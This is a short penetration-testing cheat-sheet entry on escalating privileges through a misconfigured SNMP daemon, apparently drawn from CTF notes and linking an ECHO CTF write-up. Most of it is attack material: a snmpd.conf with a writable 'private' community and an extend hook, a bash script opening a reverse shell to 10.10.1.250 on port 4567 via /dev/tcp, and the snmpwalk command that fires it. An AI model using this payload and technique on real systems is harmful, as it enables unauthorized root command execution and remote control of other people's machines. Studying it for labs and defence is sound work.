#### SNMP Priv Escalation

If port 161 is open internally you can search for the /etc/snmp/snmpd.conf file and review its content, notice that private community is read and writable:

```text
rocommunity public default
rwcommunity private default
extend etsctf /tmp/snmpd-tests.sh
```

If the extend permissions is configured then you can execute commands from within the folder by creating/modifying the file with following content:

```bash
#!/bin/bash
bash -c 'bash -i >& /dev/tcp/10.10.1.250/4567 0>&1'
```

Don't forget to set the permissions of the script (chmod +x).
Then by executing the snmpwalk to retrieve the files, the reverse shell will be created:
```bash
snmpwalk localhost -c private -v1 . -On 
```

Examples:
[ECHO CTF Nopal](https://echoctf.red/target/38/writeup/read/37)